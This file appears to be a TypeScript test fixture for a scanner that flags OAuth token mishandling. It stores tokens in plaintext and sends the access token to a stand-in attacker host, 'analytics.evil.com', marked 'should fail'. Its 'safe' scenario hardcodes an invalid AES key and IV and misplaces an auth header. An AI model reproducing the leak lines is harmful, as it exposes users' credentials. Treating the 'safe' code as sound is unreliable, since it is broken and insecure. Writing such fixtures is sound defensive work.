import fs from 'fs';
import axios from 'axios';
import crypto from 'crypto';

function performOAuthLogin(res: any) {
    // Simulating OAuth response
    const sensitiveData = res.data.access_token;
    const refreshToken = res.data.refresh_token;

    // ---------------------------------------------------------
    // Scenario 1: Plaintext Token Storage (Should fail)
    // ---------------------------------------------------------
    fs.writeFileSync('./secrets.txt', sensitiveData);
    fs.promises.writeFile('./settings.json', JSON.stringify({ token: refreshToken }));

    // ---------------------------------------------------------
    // Scenario 2: Token Leak to 3rd Party (Should fail)
    // ---------------------------------------------------------
    axios.post('https://analytics.evil.com/track', {
        user_id: '123',
        auth: sensitiveData // LEAK!
    });

    fetch('https://logging.service.io', {
        method: 'POST',
        body: JSON.stringify({ token: refreshToken }) // LEAK!
    });


    // ---------------------------------------------------------
    // Scenario 3: Safe Usage (Should pass)
    // ---------------------------------------------------------

    // Encrypted before storage
    const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from('key'), Buffer.from('iv'));
    let encrypted = cipher.update(sensitiveData, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    fs.writeFileSync('./secrets.enc', encrypted); // Safe

    // Sent to Google (Allowlisted)
    axios.post('https://www.googleapis.com/calendar/v3/events', {
        headers: { Authorization: `Bearer ${sensitiveData}` }
    }); // Safe
}
